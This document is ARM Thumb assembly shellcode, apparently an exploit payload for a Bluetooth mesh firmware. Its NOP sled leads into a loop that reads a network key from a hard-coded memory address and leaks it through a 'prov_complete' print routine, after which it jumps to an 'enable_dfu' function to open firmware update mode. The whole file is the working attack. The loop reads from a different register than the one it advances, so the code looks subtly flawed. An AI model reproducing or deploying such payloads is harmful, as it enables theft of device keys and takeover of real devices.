.syntax unified
.thumb

.section .text
.global _start
.type _start, %function

_start:
    NOP
    NOP
    NOP
    NOP
    NOP
    NOP
    NOP
    NOP
    NOP
    NOP
    NOP
    NOP
    NOP
    NOP
    NOP
    NOP
    NOP
    NOP
    NOP
    NOP
    NOP            

    MOV r6, #0 
    LDR r7, =0x2000fa90     @ net_key base addr
    LDR r5, =0x00027a28     @ prov_complete addr, to print data
    ORR r5, r5, #1          @ thumb mode: addr must have lsb 1

loop:
    LDRH r1, [r2]           @ load next 2 bytes
    ADD r7, r7, #2          @ inc by 2 bytes
    BLX r5                  @ call prov_complete
    ADD r6, r6, #1          @ increment
    CMP r6, #8              
    BNE loop                @ loop 8 times

    LDR r5, =0x00027f54     @ add addr of enable_dfu
    ORR r5, r5, #1
    BX r5
    LDR r5, =0x00027c9c     @ broadcast_sensor_data addr, to spin forever
    ORR r5, r5, #1
    BX r5

